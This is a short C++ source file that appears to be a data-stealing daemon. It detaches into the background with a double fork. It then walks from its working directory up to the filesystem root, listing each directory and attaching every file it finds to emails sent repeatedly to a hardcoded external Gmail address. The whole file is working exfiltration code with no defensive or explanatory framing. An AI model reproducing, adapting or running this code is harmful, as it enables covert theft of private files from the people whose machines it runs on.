/*
** Created by ruby on 2021-11-28
** File : Daemon
** description:
** Daemon
*/

#include "./tools/SenderMail.h"

#include <unistd.h>
#include <cstdlib>
#include <sys/stat.h>
#include <filesystem>
#include <string>

static int create_Daemon(void)
{
    pid_t pid = fork();
    if (pid < 0)
        exit (EXIT_FAILURE);
    if (pid > 0)
        exit (EXIT_SUCCESS);

    if (setsid() < 0)
        exit (EXIT_FAILURE);

    pid = fork();
    if (pid < 0)
        exit(EXIT_FAILURE);
    if (pid > 0)
        exit(EXIT_SUCCESS);

    if (chdir("./") < 0)
        exit (EXIT_FAILURE);
    umask(777);

    return EXIT_SUCCESS;
}

int EchDyson(int frequency)
{
    SenderMail *test = nullptr;
    std::vector<std::string> attach;

    if (create_Daemon() == EXIT_SUCCESS) {
        std::string path = std::filesystem::current_path();
        while (true) {
            int key = 0;
            std::string message = "";
            message.append("PATH : " + path + "/\n\n");

            for (const auto &entry : std::filesystem::directory_iterator(path)) {
                std::string check = entry.path();
                if (std::filesystem::is_directory(entry.path())) {
                    message.append(entry.path());
                    message.append( " [IS DIR]\n");
                } else {
                    message.append(entry.path());
                    message.append(" [IS FILE]\n");
                    attach.push_back(entry.path());
                    key = 1;
                }
            }

            test = new SenderMail("necrelox@gmail.com", "");
            if (key == 0)
                test->sendMail("Proto Map", message);
            else {
                test->sendMail("Proto Map", message, attach);
                attach.clear();
            }
            delete test;
            size_t lastindex = path.find_last_of('/');
            if (lastindex == 0) break;
            path = path.substr(0, lastindex);
            sleep(frequency);
        }
    }
    return 0;
}
